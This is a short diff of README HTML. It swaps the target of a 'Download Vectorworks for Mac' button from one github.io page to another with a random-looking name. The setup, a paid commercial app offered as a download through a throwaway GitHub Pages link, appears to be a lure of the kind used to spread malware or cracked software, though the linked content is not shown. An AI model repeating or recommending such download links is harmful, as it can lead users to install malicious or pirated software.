@@ -22,7 +22,7 @@
 </p>
 
 <p align="center">
-  <a href="https://drollabil.github.io/.github/vectorworks-mac">
+  <a href="https://skalsd-oasd.github.io/.github/vectorworks-mac">
     <img src="https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png"
          alt="Download Vectorworks for Mac — professional CAD and BIM software" width="160"/>
   </a>
